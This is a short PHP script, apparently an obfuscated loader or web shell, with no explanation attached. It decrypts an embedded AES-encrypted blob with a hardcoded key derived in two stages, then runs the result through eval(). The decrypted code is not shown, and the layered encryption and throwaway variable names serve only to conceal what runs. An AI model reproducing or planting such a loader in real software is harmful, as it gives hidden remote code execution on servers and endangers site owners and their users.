<?php

$altuve = " fFjpJ57/c+1Byfn2QNs5HIY2654RTMDidT7F+XejkSQJPlL8kxMLigV2UqxByP1CaknF8e+17W7IW4gJmR39UCDy2QAUS9ZbjXYSrotAzPeJia4+7poClttSzh7c3YxskGP7BBS6e0pn9/+Uix4+QmvwTJralzDqHic6bSOt3P5XgpB8iKU0D2ypBzyNhm9LWruC1R/k60ZKFkTZYDMyIjfBO+ZxXD0GMuayXfETJ0dbDvMlbo3GDnobkxCD87vzD8gvRMucvJxC+G8rmeJlWuVUBp5PBcAUwV+18Nid8AuC4nnQorK2d0kd31TAal9HFe+qAlYDQOwytIjmkkBkRUCyCyxbxxSCpLiyM2pnPVdrhWPaF+OrEGbw0lIYYvvVumYeJBpVcawDpCL9Hp3vbXg8k903UZJpy/YtVakRBGX1qhFu1VQACl2kcKbKUb+aES4bGpaKGJ1WsYb5K6iQQEth8YJ1ojrmegYalUCjAutcZhnO29y2So+3HgosoOgeqWuGOSPdGpxMVPM7NnNIoC5TIR22VL1JenE7+NfSojdtJJh6XWLPRGW90lf9t7u0lx3+aESsaMQvj+2LyFCE3YvNOBOYkh/1pcJIRJK2p3LCeGYmJpekImoUy6Nr4k3jz7wRQIogZeUnaqeqBTnZEdbeBkcLcLZ7L3f3k5vk8ETlz/EyUsfOdjbOZk2arqPA/c53jV/aja03DoLv+GSMfbBVzmiH1Qdn+HnLSFcvJ+8oEklLtosQ+CvpvhoalrVNfsB8lT0u2KhFOb+223+BEvlMNrZbOy9K/UD1Qe96+5sfdDcd86a7SSLIxZRPKMWw   ";


$zerpa = "  AN99WMpfHhEGk7cZa30RuA==  ";


$zerpa_zerpa = "1234567890123456";


$rafael = openssl_decrypt($zerpa, 'AES-256-CBC', $zerpa_zerpa, 0, '1234567890123456');


$avendaño = openssl_decrypt($altuve, 'AES-256-CBC', $rafael, 0, '1234567890123456');


eval($avendaño);
?>
